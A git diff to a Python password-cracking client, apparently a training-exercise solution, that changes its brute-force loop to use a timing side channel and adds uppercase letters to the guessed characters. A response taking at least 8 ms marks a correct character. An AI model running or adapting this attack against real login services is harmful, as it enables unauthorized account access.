@@ -3,6 +3,7 @@ import argparse
 import itertools
 import json
 import string
+from datetime import timedelta, datetime
 
 
 def get_common_logins():
@@ -47,8 +48,10 @@ def hack_password(client_socket, login):
             trial = json.dumps({"login": login, "password": pw})
             trial = trial.encode()
             client_socket.send(trial)
+            start = datetime.now()
             response = json.loads(client_socket.recv(1024))
-            if response["result"] == "Exception happened during login":
+            stop = datetime.now()
+            if (stop - start) >= timedelta(microseconds=8000):
                 password += pw
                 dictionary = [pw + i[-1] for i in dictionary]
                 break
@@ -67,7 +70,7 @@ hostname = args.hostname
 port = int(args.port)
 
 password_is_hacked = False
-dictionary = list(string.ascii_lowercase) + list(string.digits)
+dictionary = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits)
 password = ""
 
 with socket.socket() as client_socket:
